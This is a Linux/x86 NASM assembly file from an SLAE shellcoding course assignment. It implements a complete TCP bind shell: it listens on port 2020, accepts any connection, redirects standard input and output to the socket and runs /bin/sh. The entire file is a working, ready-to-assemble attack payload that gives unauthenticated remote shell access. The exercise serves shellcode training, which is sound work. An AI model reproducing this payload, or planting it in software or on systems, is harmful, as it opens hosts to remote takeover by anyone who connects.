; SLAE Assignment #1: TCP Bind Shell Linux/x86 shellcode
; Author: Jason Doyle (@_jasondoyle)

global _start

section .text

_start:

	; socket 0x1 socketcall()
	; int socketcall(int call, unsigned long *args);
	; int socket(int domain, int type, int protocol);
	xor ebx, ebx		; zero register
	push ebx		; IPPROTO_IP 0x0	
	push byte 0x1		; SOCK_STREAM 0x1
	push byte 0x2		; AF_INET 0x2
	mov ecx, esp		; pointer to args
	inc ebx			; 0x1 socket call number
	xor eax, eax		; zero register
	mov al, 0x66		; sys call 102
	int 0x80		; socketcall()

	; bind 0x2 socketcall()
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	xor edx, edx		; zero register
	mov dl, al		; save returned socketfd
	xor esi, esi		; zero register
	push esi		; 0 for any sockaddr
	push word 0xE407	; 2020 for sockaddr port + pad
	push word 0x2		; AF_INET 0x2 for sockaddr family + pad
	mov ecx, esp		; save pointer to sockaddr struct
	push 0x10		; 16 byte size for sockaddr struct
	push ecx		; pass pointer to sockaddr struct
	push edx		; socketfd
	mov ecx, esp		; pass pointer to bind() args
        mov al, 0x66		; sys call 102
        mov bl, 0x2		; 0x2 bind call number
	int 0x80		; socketcall()

	; listen 0x4 socketcall()
	; int listen(int sockfd, int backlog);
	push esi		; backlog=0
	push edx		; sockfd
	mov ecx, esp		; pass pointer to listen() args
	mov al, 0x66		; sys call 102
	mov bl, 0x4		; 0x4 listen call number
	int 0x80		; socketcall()

	; accept 0x5 socketcall()
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	push esi		; addrlen=0
	push esi		; 0 for any sockaddr
	push edx		; sockfd
	mov ecx, esp		; pass pointer to accept() args
	mov al, 0x66		; sys call 102
	mov bl, 0x5		; 0x5 accept call number
	int 0x80		; socketcall()

	; dup2() to redirect stdin, stdout, stderr to sockfd
	; int dup2(int oldfd, int newfd);
	xor ecx, ecx		; zero register
	mov cl, 0x3		; init counter to 3
	mov ebx, eax		; pass sockfd as oldfd	
DupLoop:
	push ecx		; save counter
	dec ecx			; newfd: stderr(3), stdout(2), stdin(1)
	mov al, 0x3f		; sys call 63
	int 0x80		; dup2()
	pop ecx			; restore counter
	loop DupLoop		

	; execve() to execute /bin/sh
	; int execve(const char *filename, char *const argv[],
        ;         char *const envp[]);
	push esi		; NULL terminate string
	push 0x68732f2f		; hs// (padded)
	push 0x6e69622f		; nib/
	mov ebx, esp		; save pointer to string
	mov ecx, esi		; NULL argv
	mov edx, esi		; NULL envp
	mov al, 0xb		; sys call 11
	int 0x80		; execve()
